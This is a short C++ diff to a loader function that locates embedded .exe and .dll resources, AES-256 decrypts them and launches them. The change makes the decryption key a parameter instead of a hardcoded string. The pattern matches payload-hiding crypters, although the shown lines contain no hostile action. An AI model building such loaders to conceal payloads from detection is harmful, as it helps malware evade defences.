@@ -9,7 +9,7 @@
 #include "../aes256/aes256decrypt.hpp"
 
 // Function to load the resources, and then launch them
-PROCESS_INFORMATION loadResource()
+PROCESS_INFORMATION loadResource(std::string key)
 {
     // Finding the .exe and the .dll resource
     HMODULE hModule {nullptr};
@@ -95,7 +95,6 @@ PROCESS_INFORMATION loadResource()
     }
 
     // Decrypt the resources
-    std::string key {"abcdefghijklmnop"};
     char* cKey = key.data();
     AES256Decrypt(cExePath, cKey);
     AES256Decrypt(cDllPath, cKey);
